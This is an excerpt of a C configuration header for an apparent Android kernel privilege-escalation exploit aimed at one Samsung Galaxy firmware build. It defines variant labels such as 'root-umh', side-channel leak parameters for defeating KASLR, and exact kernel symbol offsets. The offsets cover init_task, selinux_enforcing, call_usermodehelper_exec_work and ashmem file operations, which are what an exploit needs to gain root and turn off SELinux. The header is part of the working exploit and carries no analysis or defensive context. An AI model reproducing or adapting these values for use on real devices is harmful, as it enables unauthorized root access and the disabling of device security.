...
#define BUILD_VARIANT_LABEL "e1q-S9210ZHS5CZB2-app-fresh-rebuild"
#define APP_PHYS_P0_ORACLE 1
#define APP_REQUIRE_FRESH_P0_SESSION 1
#else
#define BUILD_VARIANT_LABEL "e1q-S9210ZHS5CZB2-root-umh-fresh-rebuild"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/e1qzhx/e1q:16/BP2A.250605.031.A3/S9210ZHS5CZB2:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
/* Recovered LinuxLoader selects RAM base + the ARM64 0x80000 load offset. */
...
#define PIPE_KSNITCH_PAYLOAD_MODE 2
#define PIPE_KSNITCH_APPENDED_FUTEXES 4096
#define PIPE_KSNITCH_REPEAT_MEASUREMENT 128
#define PIPE_KSNITCH_AVERAGE 8
...
#define APP_SLIDE_MIN_OBJECT_INDEX 20
#define APP_SLIDE_MAX_OBJECT_INDEX 30
#define APP_FOPS_MIN_OBJECT_INDEX 24
#define APP_PIPE_PAGE_SETUP_ATTEMPTS 12
#define P0_PIPE_PREPARE_ATTEMPTS 12
#define APP_MIN_ATTEMPT_TIMEOUT_SEC 360
#define APP_MIN_P0_ATTEMPT_TIMEOUT_SEC 300
#endif

#define SLIDE_TRACEFS_EVENT_ID 106
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000da848ULL
...
#define P0_FINGERPRINT_HEADER \
  "targets/e1q-S9210ZHS5CZB2/p0_fingerprint.h"
#endif
...
#define ASHMEM_MISC_FOPS_OFF 0x022bfc30ULL
#define ASHMEM_FOPS_OFF 0x0134e7a0ULL
#define ASHMEM_IOCTL_OFF 0x00cd9b18ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00cda450ULL
#define ASHMEM_MMAP_OFF 0x00cda4a8ULL
#define ASHMEM_OPEN_OFF 0x00cda6d4ULL
#define ASHMEM_RELEASE_OFF 0x00cda75cULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00cda87cULL
#define CONFIGFS_READ_ITER_OFF 0x0046dcc0ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0046e1f0ULL
#define COPY_SPLICE_READ_OFF 0x003ec2c8ULL
#define NOOP_LLSEEK_OFF 0x0039e518ULL
#define INIT_TASK_OFF 0x0215f8c0ULL
#define ROOT_TASK_GROUP_OFF 0x0234cd80ULL
#define SELINUX_ENFORCING_OFF 0x02421460ULL
#define KMALLOC_CACHES_OFF 0x016c0938ULL
#define ANON_PIPE_BUF_OPS_OFF 0x011a6bd0ULL
...
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d308cULL
#define SYSTEM_UNBOUND_WQ_OFF 0x0214ae60ULL
...
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x0160b743ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02152a20ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0227ab38ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x024c35a8ULL
